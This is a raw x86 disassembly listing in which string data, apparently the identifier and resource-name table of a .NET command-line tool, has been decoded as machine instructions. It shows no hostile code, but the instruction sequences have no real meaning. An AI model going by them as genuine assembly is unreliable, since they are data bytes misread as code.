  403c2e:	jb     0x403c95
  403c30:	jae    0x403ca5
  403c32:	imul   ebp,DWORD PTR [edi+0x6e],0x61724700
  403c39:	jo     0x403ca3
  403c3b:	inc    ebx
  403c3c:	ins    DWORD PTR es:[edi],dx
  403c3d:	add    BYTE PTR fs:[edi+0x72],al
  403c41:	popa   
  403c42:	jo     0x403cac
  403c44:	inc    ebx
  403c45:	ins    DWORD PTR es:[edi],dx
  403c46:	fs inc ecx
  403c48:	jb     0x403cb1
  403c4a:	jne    0x403cb9
  403c4c:	outs   dx,BYTE PTR gs:[esi]
  403c4e:	je     0x403c50
  403c50:	push   edx
  403c51:	gs jae 0x403cc3
  403c54:	jne    0x403cc8
  403c56:	arpl   WORD PTR [ebp+0x73],sp
  403c59:	add    BYTE PTR [esi+0x69],dl
  403c5c:	jae    0x403cd3
  403c5e:	popa   
  403c5f:	ins    BYTE PTR es:[edi],dx
  403c60:	push   ebx
  403c61:	je     0x403cd8
  403c63:	imul   ebp,DWORD PTR fs:[edi+0x56],0x69737265
  403c6b:	outs   dx,DWORD PTR ds:[esi]
  403c6c:	outs   dx,BYTE PTR ds:[esi]
  403c6d:	dec    ecx
  403c6e:	outs   dx,BYTE PTR ds:[esi]
  403c6f:	outs   dx,WORD PTR ds:[esi]
  403c71:	add    BYTE PTR [ebp+0x73],ch
  403c74:	arpl   WORD PTR [edi+0x72],bp
  403c77:	ins    BYTE PTR es:[edi],dx
  403c78:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  403c7f:	gs ins DWORD PTR es:[edi],dx
  403c81:	add    BYTE PTR [edi+0x62],cl
  403c84:	push   0x65
  403c86:	arpl   WORD PTR [eax+eax*1+0x45],si
  403c8a:	outs   dx,BYTE PTR ds:[esi]
  403c8b:	jne    0x403cfa
  403c8d:	add    BYTE PTR [ebp+0x61],cl
  403c90:	imul   ebp,DWORD PTR [esi+0x0],0x6f74632e
  403c97:	jb     0x403c99
  403c99:	dec    ebp
  403c9a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403ca1:	je     0x403cd1
  403ca3:	push   esi
  403ca4:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403cab:	jne    0x403d11
  403cad:	imul   ebp,DWORD PTR [edi+0x2e],0x676f7250
  403cb4:	jb     0x403d1b
  403cb6:	jae    0x403d2b
  403cb8:	imul   ebp,DWORD PTR [edi+0x6e],0x6d6f432e
  403cbf:	ins    DWORD PTR es:[edi],dx
  403cc0:	popa   
  403cc1:	outs   dx,BYTE PTR ds:[esi]
  403cc2:	fs dec esp
  403cc4:	imul   ebp,DWORD PTR [esi+0x65],0x61724700
  403ccb:	jo     0x403d35
  403ccd:	inc    ebx
  403cce:	ins    DWORD PTR es:[edi],dx
  403ccf:	fs dec esp
  403cd1:	imul   esp,DWORD PTR [edx+0x72],0x797261
  403cd8:	pop    edi
  403cd9:	arpl   WORD PTR [ebp+0x64],bp
  403cdc:	dec    esp
  403cdd:	imul   esp,DWORD PTR [edx+0x0],0x5f746567
  403ce4:	inc    ebx
  403ce5:	outs   dx,DWORD PTR ds:[esi]
  403ce6:	ins    DWORD PTR es:[edi],dx
  403ce7:	ins    DWORD PTR es:[edi],dx
  403ce8:	popa   
  403ce9:	outs   dx,BYTE PTR ds:[esi]
  403cea:	fs inc ebp
  403cec:	js     0x403d53
  403cee:	arpl   WORD PTR [ebp+0x74],si
  403cf1:	outs   dx,DWORD PTR ds:[esi]
  403cf2:	jb     0x403cf4
  403cf4:	jae    0x403d5b
  403cf6:	je     0x403d57
  403cf8:	inc    ebx
  403cf9:	outs   dx,DWORD PTR ds:[esi]
  403cfa:	ins    DWORD PTR es:[edi],dx
  403cfb:	ins    DWORD PTR es:[edi],dx
  403cfc:	popa   
  403cfd:	outs   dx,BYTE PTR ds:[esi]
  403cfe:	fs inc ebp
  403d00:	js     0x403d67
  403d02:	arpl   WORD PTR [ebp+0x74],si
  403d05:	outs   dx,DWORD PTR ds:[esi]
  403d06:	jb     0x403d08
  403d08:	push   edx
  403d09:	jne    0x403d79
  403d0b:	add    BYTE PTR [eax+0x72],dl
  403d0e:	outs   dx,DWORD PTR ds:[esi]
  403d0f:	arpl   WORD PTR [ebp+0x73],sp
  403d12:	jae    0x403d55
  403d14:	jb     0x403d7d
  403d16:	jne    0x403d85
  403d18:	outs   dx,BYTE PTR gs:[esi]
  403d1a:	je     0x403d8f
  403d1c:	add    BYTE PTR [eax+0x72],dl
  403d1f:	outs   dx,DWORD PTR ds:[esi]
  403d20:	arpl   WORD PTR [ebp+0x73],sp
  403d23:	jae    0x403d78
  403d25:	imul   ebp,DWORD PTR [esi+0x67],0x6c46656c
  403d2c:	popa   
  403d2d:	addr16 inc ecx
  403d2f:	jb     0x403d98
  403d31:	jne    0x403da0
  403d33:	outs   dx,BYTE PTR gs:[esi]
  403d35:	je     0x403d37
  403d37:	push   ebx
  403d38:	push   0x6548776f
  403d3d:	ins    BYTE PTR es:[edi],dx
  403d3e:	jo     0x403d8d
  403d40:	gs jae 0x403db6
  403d43:	popa   
  403d44:	add    BYTE PTR gs:[bx+si+0x72],dl
  403d49:	outs   dx,DWORD PTR ds:[esi]
  403d4a:	arpl   WORD PTR [ebp+0x73],sp
  403d4d:	jae    0x403d93
  403d4f:	outs   dx,DWORD PTR ds:[esi]
  403d50:	jne    0x403db4
  403d52:	ins    BYTE PTR es:[edi],dx
  403d53:	gs push eax
  403d55:	popa   
  403d56:	jb     0x403dcc
  403d58:	inc    ecx
  403d59:	jb     0x403dc2
  403d5b:	jne    0x403dca
  403d5d:	outs   dx,BYTE PTR gs:[esi]
  403d5f:	je     0x403d61
  403d61:	push   eax
  403d62:	jb     0x403dd3
  403d64:	arpl   WORD PTR [ebp+0x73],sp
  403d67:	jae    0x403dbe
  403d69:	dec    ecx
  403d6a:	inc    ebx
  403d6b:	jne    0x403dd9
  403d6d:	je     0x403de4
  403d6f:	jb     0x403dd6
  403d71:	inc    ecx
  403d72:	jb     0x403ddb
  403d74:	jne    0x403de3
  403d76:	outs   dx,BYTE PTR gs:[esi]
  403d78:	je     0x403d7a
  403d7a:	push   eax
  403d7b:	jb     0x403dec
  403d7d:	arpl   WORD PTR [ebp+0x73],sp
  403d80:	jae    0x403dcd
  403d82:	gs jns 0x403ddb
  403d85:	popa   
  403d86:	ins    BYTE PTR es:[edi],dx
  403d87:	jne    0x403dee
  403d89:	push   eax
  403d8a:	popa   
  403d8b:	imul   esi,DWORD PTR [edx+0x41],0x6d756772
  403d92:	outs   dx,BYTE PTR gs:[esi]
  403d94:	je     0x403d96
  403d96:	inc    edi
  403d97:	jb     0x403dfa
  403d99:	jo     0x403e03
  403d9b:	inc    ebx
  403d9c:	ins    DWORD PTR es:[edi],dx
  403d9d:	fs dec edi
  403d9f:	jne    0x403e15
  403da1:	jo     0x403e18
  403da3:	je     0x403deb
  403da5:	outs   dx,DWORD PTR ds:[esi]
  403da6:	jb     0x403e15
  403da8:	popa   
  403da9:	je     0x403dab
  403dab:	push   eax
  403dac:	popa   
  403dad:	jb     0x403e22
  403daf:	gs dec edi
  403db1:	jne    0x403e27
  403db3:	jo     0x403e2a
  403db5:	je     0x403dfd
  403db7:	outs   dx,DWORD PTR ds:[esi]
  403db8:	jb     0x403e27
  403dba:	popa   
  403dbb:	je     0x403dbd
  403dbd:	push   esp
  403dbe:	push   0x41776f72
  403dc3:	jb     0x403e2c
  403dc5:	jne    0x403e34
  403dc7:	outs   dx,BYTE PTR gs:[esi]
  403dc9:	je     0x403e10
  403dcb:	jb     0x403e3f
  403dcd:	outs   dx,DWORD PTR ds:[esi]
  403dce:	jb     0x403dd0
  403dd0:	inc    ebx
  403dd1:	outs   dx,DWORD PTR ds:[esi]
  403dd2:	ins    DWORD PTR es:[edi],dx
  403dd3:	ins    DWORD PTR es:[edi],dx
  403dd4:	popa   
  403dd5:	outs   dx,BYTE PTR ds:[esi]
  403dd6:	fs inc ebp
  403dd8:	js     0x403e3f
  403dda:	arpl   WORD PTR [ebp+0x74],si
  403ddd:	outs   dx,DWORD PTR ds:[esi]
  403dde:	jb     0x403de0
  403de0:	jbe    0x403e43
  403de2:	ins    BYTE PTR es:[edi],dx
  403de3:	jne    0x403e4a
  403de5:	pop    edi
  403de6:	pop    edi
  403de7:	add    BYTE PTR [esi+0x6f],cl
  403dea:	outs   dx,BYTE PTR ds:[esi]
  403deb:	add    BYTE PTR gs:[eax+0x65],cl
  403def:	ins    BYTE PTR es:[edi],dx
  403df0:	jo     0x403df2
  403df2:	inc    ecx
  403df3:	ins    BYTE PTR es:[edi],dx
  403df4:	ins    BYTE PTR es:[edi],dx
  403df5:	add    BYTE PTR [ebp+0x78],al
  403df8:	arpl   WORD PTR [ebp+0x70],sp
  403dfb:	je     0x403e66
  403dfd:	outs   dx,DWORD PTR ds:[esi]
  403dfe:	outs   dx,BYTE PTR ds:[esi]
  403dff:	jae    0x403e01
  403e01:	dec    ecx
  403e02:	outs   dx,BYTE PTR ds:[esi]
  403e03:	jo     0x403e7a
  403e05:	je     0x403e07
  403e07:	dec    edi
  403e08:	jne    0x403e7e
  403e0a:	jo     0x403e81
  403e0c:	je     0x403e0e
  403e0e:	dec    edi
  403e0f:	jne    0x403e85
  403e11:	jo     0x403e88
  403e13:	je     0x403e5b
  403e15:	outs   dx,DWORD PTR ds:[esi]
  403e16:	jb     0x403e85
  403e18:	popa   
  403e19:	je     0x403e1b
  403e1b:	push   ecx
  403e1c:	jne    0x403e83
  403e1e:	jb     0x403e99
  403e20:	inc    esi
  403e21:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x72657551
  403e29:	jns    0x403e7e
  403e2b:	je     0x403e9f
  403e2d:	imul   ebp,DWORD PTR [esi+0x67],0x43495500
  403e34:	jne    0x403ea2
  403e36:	je     0x403ead
  403e38:	jb     0x403e9f
  403e3a:	add    BYTE PTR [eax+0x61],dl
  403e3d:	je     0x403ea7
  403e3f:	add    BYTE PTR [ebx+0x79],dl
  403e42:	jae    0x403eb8
  403e44:	gs ins DWORD PTR es:[edi],dx
  403e46:	cs push edx
  403e48:	gs jae 0x403eba
  403e4b:	jne    0x403ebf
  403e4d:	arpl   WORD PTR [ebp+0x73],sp
  403e50:	add    BYTE PTR [edx+0x65],dl
  403e53:	jae    0x403ec4
  403e55:	jne    0x403ec9
  403e57:	arpl   WORD PTR [ebp+0x4d],sp
  403e5a:	popa   
  403e5b:	outs   dx,BYTE PTR ds:[esi]
  403e5c:	popa   
  403e5d:	addr16 gs jb 0x403e61
  403e61:	jb     0x403ec8
  403e63:	jae    0x403ed4
  403e65:	jne    0x403ed9
  403e67:	arpl   WORD PTR [ebp+0x4d],sp
  403e6a:	popa   
  403e6b:	outs   dx,BYTE PTR ds:[esi]
  403e6c:	add    BYTE PTR [ebx+0x79],dl
  403e6f:	jae    0x403ee5
  403e71:	gs ins DWORD PTR es:[edi],dx
  403e73:	cs inc edi
  403e75:	ins    BYTE PTR es:[edi],dx
  403e76:	outs   dx,DWORD PTR ds:[esi]
  403e77:	bound  esp,QWORD PTR [ecx+0x6c]
  403e7a:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403e81:	add    BYTE PTR [ebx+0x75],al
  403e84:	ins    BYTE PTR es:[edi],dx
  403e85:	je     0x403efc
  403e87:	jb     0x403eee
  403e89:	dec    ecx
  403e8a:	outs   dx,BYTE PTR ds:[esi]
  403e8b:	outs   dx,WORD PTR ds:[esi]
  403e8d:	add    BYTE PTR [edx+0x65],dh
  403e90:	jae    0x403f01
  403e92:	jne    0x403f06
  403e94:	arpl   WORD PTR [ebp+0x43],sp
  403e97:	jne    0x403f05
  403e99:	je     0x403f10
  403e9b:	jb     0x403f02
  403e9d:	add    BYTE PTR [edi+0x65],ah
  403ea0:	je     0x403f01
  403ea2:	push   edx
  403ea3:	gs jae 0x403f15
  403ea6:	jne    0x403f1a
  403ea8:	arpl   WORD PTR [ebp+0x4d],sp
  403eab:	popa   
  403eac:	outs   dx,BYTE PTR ds:[esi]
  403ead:	popa   
  403eae:	addr16 gs jb 0x403eb2
  403eb2:	addr16 gs je 0x403f15
  403eb6:	inc    ebx
  403eb7:	jne    0x403f25
  403eb9:	je     0x403f30
  403ebb:	jb     0x403f22
  403ebd:	add    BYTE PTR [ebx+0x65],dh
  403ec0:	je     0x403f21
  403ec2:	inc    ebx
  403ec3:	jne    0x403f31
  403ec5:	je     0x403f3c
  403ec7:	jb     0x403f2e
  403ec9:	add    BYTE PTR [edi+0x65],ah
  403ecc:	je     0x403f2d
  403ece:	inc    ebp
  403ecf:	jb     0x403f43
  403ed1:	outs   dx,DWORD PTR ds:[esi]
  403ed2:	jb     0x403f33
  403ed4:	dec    ecx
  403ed5:	outs   dx,BYTE PTR ds:[esi]
  403ed6:	jbe    0x403f39
  403ed8:	ins    BYTE PTR es:[edi],dx
  403ed9:	imul   esp,DWORD PTR [ebx+eax*2+0x75],0x7275746c
  403ee1:	gs dec esi
  403ee3:	popa   
  403ee4:	ins    DWORD PTR es:[edi],dx
  403ee5:	add    BYTE PTR gs:[edi+0x65],ah
  403ee9:	je     0x403f4a
  403eeb:	inc    ebp
  403eec:	jb     0x403f60
  403eee:	outs   dx,DWORD PTR ds:[esi]
  403eef:	jb     0x403f50
  403ef1:	dec    ebp
  403ef2:	imul   esi,DWORD PTR [ebx+0x73],0x41676e69
  403ef9:	jb     0x403f62
  403efb:	jne    0x403f6a
  403efd:	outs   dx,BYTE PTR gs:[esi]
  403eff:	je     0x403f01
  403f01:	addr16 gs je 0x403f64
  403f05:	inc    ebp
  403f06:	jb     0x403f7a
  403f08:	outs   dx,DWORD PTR ds:[esi]
  403f09:	jb     0x403f6a
  403f0b:	dec    ebp
  403f0c:	imul   esi,DWORD PTR [ebx+0x73],0x4b676e69
  403f13:	gs jns 0x403f57
  403f16:	jb     0x403f7f
  403f18:	jne    0x403f87
  403f1a:	outs   dx,BYTE PTR gs:[esi]
  403f1c:	je     0x403f1e
  403f1e:	addr16 gs je 0x403f81
  403f22:	inc    ebp
  403f23:	jb     0x403f97
  403f25:	outs   dx,DWORD PTR ds:[esi]
  403f26:	jb     0x403f87
  403f28:	dec    esi
  403f29:	jne    0x403f97
  403f2b:	ins    BYTE PTR es:[edi],dx
  403f2c:	inc    ecx
  403f2d:	jb     0x403f96
  403f2f:	jne    0x403f9e
  403f31:	outs   dx,BYTE PTR gs:[esi]
  403f33:	je     0x403f35
  403f35:	addr16 gs je 0x403f98
  403f39:	inc    ebp
  403f3a:	jb     0x403fae
  403f3c:	outs   dx,DWORD PTR ds:[esi]
  403f3d:	jb     0x403f9e
  403f3f:	dec    esi
  403f40:	jne    0x403fae
  403f42:	ins    BYTE PTR es:[edi],dx
  403f43:	dec    edi
  403f44:	jb     0x403f8b
  403f46:	ins    DWORD PTR es:[edi],dx
  403f47:	jo     0x403fbd
  403f49:	jns    0x403f8c
  403f4b:	jb     0x403fb4
  403f4d:	jne    0x403fbc
  403f4f:	outs   dx,BYTE PTR gs:[esi]
  403f51:	je     0x403f53
  403f53:	addr16 gs je 0x403fb6
  403f57:	inc    ebp
  403f58:	jb     0x403fcc
  403f5a:	outs   dx,DWORD PTR ds:[esi]
  403f5b:	jb     0x403fbc
  403f5d:	dec    esi
  403f5e:	jne    0x403fcc
  403f60:	ins    BYTE PTR es:[edi],dx
  403f61:	dec    edi
  403f62:	jb     0x403fa9
  403f64:	ins    DWORD PTR es:[edi],dx
  403f65:	jo     0x403fdb
  403f67:	jns    0x403fb4
  403f69:	gs jns 0x403fad
  403f6c:	jb     0x403fd5
  403f6e:	jne    0x403fdd
  403f70:	outs   dx,BYTE PTR gs:[esi]
  403f72:	je     0x403f74
  403f74:	addr16 gs je 0x403fd7
  403f78:	inc    ebp
  403f79:	jb     0x403fed
  403f7b:	outs   dx,DWORD PTR ds:[esi]
  403f7c:	jb     0x403fdd
  403f7e:	dec    esi
  403f7f:	jne    0x403fed
  403f81:	ins    BYTE PTR es:[edi],dx
  403f82:	dec    edi
  403f83:	jb     0x403fca
  403f85:	ins    DWORD PTR es:[edi],dx
  403f86:	jo     0x403ffc
  403f88:	jns    0x403fe0
  403f8a:	popa   
  403f8b:	ins    BYTE PTR es:[edi],dx
  403f8c:	jne    0x403ff3
  403f8e:	inc    ecx
  403f8f:	jb     0x403ff8
  403f91:	jne    0x404000
  403f93:	outs   dx,BYTE PTR gs:[esi]
  403f95:	je     0x403f97
  403f97:	addr16 gs je 0x403ffa
  403f9b:	inc    ebp
  403f9c:	jb     0x404010
  403f9e:	outs   dx,DWORD PTR ds:[esi]
  403f9f:	jb     0x404000
  403fa1:	push   ebp
  403fa2:	outs   dx,BYTE PTR ds:[esi]
  403fa3:	jb     0x40400a
  403fa5:	arpl   WORD PTR [edi+0x67],bp
  403fa8:	outs   dx,BYTE PTR ds:[esi]
  403fa9:	imul   edi,DWORD PTR [edx+0x65],0x67724164
  403fb0:	jne    0x40401f
  403fb2:	outs   dx,BYTE PTR gs:[esi]
  403fb4:	je     0x403fb6
  403fb6:	addr16 gs je 0x404019
  403fba:	inc    ebp
  403fbb:	jb     0x40402f
  403fbd:	outs   dx,DWORD PTR ds:[esi]
  403fbe:	jb     0x40401f
  403fc0:	push   ebp
  403fc1:	outs   dx,BYTE PTR ds:[esi]
  403fc2:	jb     0x404029
  403fc4:	arpl   WORD PTR [edi+0x67],bp
  403fc7:	outs   dx,BYTE PTR ds:[esi]
  403fc8:	imul   edi,DWORD PTR [edx+0x65],0x74754f64
  403fcf:	jo     0x404046
  403fd1:	je     0x404019
  403fd3:	outs   dx,DWORD PTR ds:[esi]
  403fd4:	jb     0x404043
  403fd6:	popa   
  403fd7:	je     0x403fd9
  403fd9:	addr16 gs je 0x40403c
  403fdd:	push   ebx
  403fde:	ja     0x404049
  403fe0:	je     0x404045
  403fe2:	push   0x6c6c415f
  403fe7:	pop    edi
  403fe8:	dec    esi
  403fe9:	dec    edi
  403fea:	dec    esp
  403feb:	dec    edi
  403fec:	inc    ebx
  403fed:	pop    edi
  403fee:	add    BYTE PTR [edi+0x65],ah
  403ff1:	je     0x404052
  403ff3:	push   ebx
  403ff4:	ja     0x40405f
  403ff6:	je     0x40405b
  403ff8:	push   0x6378455f
  403ffd:	gs jo  0x404074
  404000:	imul   ebp,DWORD PTR [edi+0x6e],0x4f4e5f73
  404007:	dec    esp
  404008:	dec    edi
  404009:	inc    ebx
  40400a:	pop    edi
  40400b:	add    BYTE PTR [edi+0x65],ah
  40400e:	je     0x40406f
  404010:	push   ebx
  404011:	ja     0x40407c
  404013:	je     0x404078
  404015:	push   0x6c65485f
  40401a:	jo     0x40407b
  40401c:	dec    esi
  40401d:	dec    edi
  40401e:	dec    esp
  40401f:	dec    edi
  404020:	inc    ebx
  404021:	pop    edi
  404022:	add    BYTE PTR [edi+0x65],ah
  404025:	je     0x404086
  404027:	push   ebx
  404028:	ja     0x404093
  40402a:	je     0x40408f
  40402c:	push   0x706e495f
  404031:	jne    0x4040a7
  404033:	pop    edi
  404034:	dec    esi
  404035:	dec    edi
  404036:	dec    esp
  404037:	dec    edi
  404038:	inc    ebx
  404039:	pop    edi
  40403a:	add    BYTE PTR [edi+0x65],ah
  40403d:	je     0x40409e
  40403f:	push   ebx
  404040:	ja     0x4040ab
  404042:	je     0x4040a7
  404044:	push   0x74754f5f
  404049:	jo     0x4040c0
  40404b:	je     0x4040ac
  40404d:	dec    esi
  40404e:	dec    edi
  40404f:	dec    esp
  404050:	dec    edi
  404051:	inc    ebx
  404052:	pop    edi
  404053:	add    BYTE PTR [edi+0x65],ah
  404056:	je     0x4040b7
  404058:	push   ebx
  404059:	ja     0x4040c4
  40405b:	je     0x4040c0
  40405d:	push   0x74754f5f
  404062:	jo     0x4040d9
  404064:	je     0x4040ac
  404066:	outs   dx,DWORD PTR ds:[esi]
  404067:	jb     0x4040d6
  404069:	popa   
  40406a:	je     0x4040cb
  40406c:	dec    esi
  40406d:	dec    edi
  40406e:	dec    esp
  40406f:	dec    edi
  404070:	inc    ebx
  404071:	pop    edi
  404072:	add    BYTE PTR [edi+0x65],ah
  404075:	je     0x4040d6
  404077:	push   ebx
  404078:	ja     0x4040e3
  40407a:	je     0x4040df
  40407c:	push   0x7461505f
  404081:	push   0x4c4f4e5f
  404086:	dec    edi
  404087:	inc    ebx
  404088:	pop    edi
  404089:	add    BYTE PTR [edi+0x65],ah
  40408c:	je     0x4040ed
  40408e:	push   ebx
  40408f:	ja     0x4040fa
  404091:	je     0x4040f6
  404093:	push   0x6575515f
  404098:	jb     0x404113
  40409a:	inc    esi
  40409b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x5f],0x4f4c4f4e
  4040a3:	inc    ebx
  4040a4:	pop    edi
  4040a5:	add    BYTE PTR [edi+0x65],ah
  4040a8:	je     0x404109
  4040aa:	push   ebx
  4040ab:	ja     0x404116
  4040ad:	je     0x404112
  4040af:	push   0x6575515f
  4040b4:	jb     0x40412f
  4040b6:	push   ebx
  4040b7:	je     0x40412b
  4040b9:	imul   ebp,DWORD PTR [esi+0x67],0x4c4f4e5f
  4040c0:	dec    edi
  4040c1:	inc    ebx
  4040c2:	pop    edi
  4040c3:	add    BYTE PTR [edi+0x65],ah
  4040c6:	je     0x404127
  4040c8:	push   ebx
  4040c9:	ja     0x404134
  4040cb:	je     0x404130
  4040cd:	push   0x6575515f
  4040d2:	jae    0x404148
  4040d4:	imul   ebp,DWORD PTR [edi+0x6e],0x4c4f4e5f
  4040db:	dec    edi
  4040dc:	inc    ebx
  4040dd:	pop    edi
  4040de:	add    BYTE PTR [edi+0x65],ah
  4040e1:	je     0x404142
  4040e3:	push   ebx
  4040e4:	ja     0x40414f
  4040e6:	je     0x40414b
  4040e8:	push   0x4349555f
  4040ed:	jne    0x40415b
  4040ef:	je     0x404166
  4040f1:	jb     0x404158
  4040f3:	pop    edi
  4040f4:	dec    esi
  4040f5:	dec    edi
  4040f6:	dec    esp
  4040f7:	dec    edi
  4040f8:	inc    ebx
  4040f9:	pop    edi
  4040fa:	add    BYTE PTR [edi+0x65],ah
  4040fd:	je     0x40415e
  4040ff:	push   ebx
  404100:	jns    0x404170
  404102:	je     0x404165
  404104:	js     0x404106
  404106:	inc    ebx
  404107:	jne    0x404175
  404109:	je     0x404180
  40410b:	jb     0x404172
  40410d:	add    BYTE PTR [ebp+0x72],al
  404110:	jb     0x404181
  404112:	jb     0x404173
  404114:	dec    ecx
  404115:	outs   dx,BYTE PTR ds:[esi]
  404116:	jbe    0x404179
  404118:	ins    BYTE PTR es:[edi],dx
  404119:	imul   esp,DWORD PTR [ebx+eax*2+0x75],0x7275746c
  404121:	gs dec esi
  404123:	popa   
  404124:	ins    DWORD PTR es:[edi],dx
  404125:	add    BYTE PTR gs:[ebp+0x72],al
  404129:	jb     0x40419a
  40412b:	jb     0x40418c
  40412d:	dec    ebp
  40412e:	imul   esi,DWORD PTR [ebx+0x73],0x41676e69
  404135:	jb     0x40419e
  404137:	jne    0x4041a6
  404139:	outs   dx,BYTE PTR gs:[esi]
  40413b:	je     0x40413d
  40413d:	inc    ebp
  40413e:	jb     0x4041b2
  404140:	outs   dx,DWORD PTR ds:[esi]
  404141:	jb     0x4041a2
  404143:	dec    ebp
  404144:	imul   esi,DWORD PTR [ebx+0x73],0x4b676e69
  40414b:	gs jns 0x40418f
  40414e:	jb     0x4041b7
  404150:	jne    0x4041bf
  404152:	outs   dx,BYTE PTR gs:[esi]
  404154:	je     0x404156
  404156:	inc    ebp
  404157:	jb     0x4041cb
  404159:	outs   dx,DWORD PTR ds:[esi]
  40415a:	jb     0x4041bb
  40415c:	dec    esi
  40415d:	jne    0x4041cb
  40415f:	ins    BYTE PTR es:[edi],dx
  404160:	inc    ecx
  404161:	jb     0x4041ca
  404163:	jne    0x4041d2
  404165:	outs   dx,BYTE PTR gs:[esi]
  404167:	je     0x404169
  404169:	inc    ebp
  40416a:	jb     0x4041de
  40416c:	outs   dx,DWORD PTR ds:[esi]
  40416d:	jb     0x4041ce
  40416f:	dec    esi
  404170:	jne    0x4041de
  404172:	ins    BYTE PTR es:[edi],dx
  404173:	dec    edi
  404174:	jb     0x4041bb
  404176:	ins    DWORD PTR es:[edi],dx
  404177:	jo     0x4041ed
  404179:	jns    0x4041bc
  40417b:	jb     0x4041e4
  40417d:	jne    0x4041ec
  40417f:	outs   dx,BYTE PTR gs:[esi]
  404181:	je     0x404183
  404183:	inc    ebp
  404184:	jb     0x4041f8
  404186:	outs   dx,DWORD PTR ds:[esi]
  404187:	jb     0x4041e8
  404189:	dec    esi
  40418a:	jne    0x4041f8
  40418c:	ins    BYTE PTR es:[edi],dx
  40418d:	dec    edi
  40418e:	jb     0x4041d5
  404190:	ins    DWORD PTR es:[edi],dx
  404191:	jo     0x404207
  404193:	jns    0x4041e0
  404195:	gs jns 0x4041d9
  404198:	jb     0x404201
  40419a:	jne    0x404209
  40419c:	outs   dx,BYTE PTR gs:[esi]
  40419e:	je     0x4041a0
  4041a0:	inc    ebp
  4041a1:	jb     0x404215
  4041a3:	outs   dx,DWORD PTR ds:[esi]
  4041a4:	jb     0x404205
  4041a6:	dec    esi
  4041a7:	jne    0x404215
  4041a9:	ins    BYTE PTR es:[edi],dx
  4041aa:	dec    edi
  4041ab:	jb     0x4041f2
  4041ad:	ins    DWORD PTR es:[edi],dx
  4041ae:	jo     0x404224
  4041b0:	jns    0x404208
  4041b2:	popa   
  4041b3:	ins    BYTE PTR es:[edi],dx
  4041b4:	jne    0x40421b
  4041b6:	inc    ecx
  4041b7:	jb     0x404220
  4041b9:	jne    0x404228
  4041bb:	outs   dx,BYTE PTR gs:[esi]
  4041bd:	je     0x4041bf
  4041bf:	inc    ebp
  4041c0:	jb     0x404234
  4041c2:	outs   dx,DWORD PTR ds:[esi]
  4041c3:	jb     0x404224
  4041c5:	push   ebp
  4041c6:	outs   dx,BYTE PTR ds:[esi]
  4041c7:	jb     0x40422e
  4041c9:	arpl   WORD PTR [edi+0x67],bp
  4041cc:	outs   dx,BYTE PTR ds:[esi]
  4041cd:	imul   edi,DWORD PTR [edx+0x65],0x67724164
  4041d4:	jne    0x404243
  4041d6:	outs   dx,BYTE PTR gs:[esi]
  4041d8:	je     0x4041da
  4041da:	inc    ebp
  4041db:	jb     0x40424f
  4041dd:	outs   dx,DWORD PTR ds:[esi]
  4041de:	jb     0x40423f
  4041e0:	push   ebp
  4041e1:	outs   dx,BYTE PTR ds:[esi]
  4041e2:	jb     0x404249
  4041e4:	arpl   WORD PTR [edi+0x67],bp
  4041e7:	outs   dx,BYTE PTR ds:[esi]
  4041e8:	imul   edi,DWORD PTR [edx+0x65],0x74754f64
  4041ef:	jo     0x404266
  4041f1:	je     0x404239
  4041f3:	outs   dx,DWORD PTR ds:[esi]
  4041f4:	jb     0x404263
  4041f6:	popa   
  4041f7:	je     0x4041f9
  4041f9:	push   ebx
  4041fa:	ja     0x404265
  4041fc:	je     0x404261
  4041fe:	push   0x6c6c415f
  404203:	pop    edi
  404204:	dec    esi
  404205:	dec    edi
  404206:	dec    esp
  404207:	dec    edi
  404208:	inc    ebx
  404209:	pop    edi
  40420a:	add    BYTE PTR [ebx+0x77],dl
  40420d:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6378455f
  404215:	gs jo  0x40428c
  404218:	imul   ebp,DWORD PTR [edi+0x6e],0x4f4e5f73
  40421f:	dec    esp
  404220:	dec    edi
  404221:	inc    ebx
  404222:	pop    edi
  404223:	add    BYTE PTR [ebx+0x77],dl
  404226:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6c65485f
  40422e:	jo     0x40428f
  404230:	dec    esi
  404231:	dec    edi
  404232:	dec    esp
  404233:	dec    edi
  404234:	inc    ebx
  404235:	pop    edi
  404236:	add    BYTE PTR [ebx+0x77],dl
  404239:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x706e495f
  404241:	jne    0x4042b7
  404243:	pop    edi
  404244:	dec    esi
  404245:	dec    edi
  404246:	dec    esp
  404247:	dec    edi
  404248:	inc    ebx
  404249:	pop    edi
  40424a:	add    BYTE PTR [ebx+0x77],dl
  40424d:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x74754f5f
  404255:	jo     0x4042cc
  404257:	je     0x4042b8
  404259:	dec    esi
  40425a:	dec    edi
  40425b:	dec    esp
  40425c:	dec    edi
  40425d:	inc    ebx
  40425e:	pop    edi
  40425f:	add    BYTE PTR [ebx+0x77],dl
  404262:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x74754f5f
  40426a:	jo     0x4042e1
  40426c:	je     0x4042b4
  40426e:	outs   dx,DWORD PTR ds:[esi]
  40426f:	jb     0x4042de
  404271:	popa   
  404272:	je     0x4042d3
  404274:	dec    esi
  404275:	dec    edi
  404276:	dec    esp
  404277:	dec    edi
  404278:	inc    ebx
  404279:	pop    edi
  40427a:	add    BYTE PTR [ebx+0x77],dl
  40427d:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x7461505f
  404285:	push   0x4c4f4e5f
  40428a:	dec    edi
  40428b:	inc    ebx
  40428c:	pop    edi
  40428d:	add    BYTE PTR [ebx+0x77],dl
  404290:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6575515f
  404298:	jb     0x404313
  40429a:	inc    esi
  40429b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x5f],0x4f4c4f4e
  4042a3:	inc    ebx
  4042a4:	pop    edi
  4042a5:	add    BYTE PTR [ebx+0x77],dl
  4042a8:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6575515f
  4042b0:	jb     0x40432b
  4042b2:	push   ebx
  4042b3:	je     0x404327
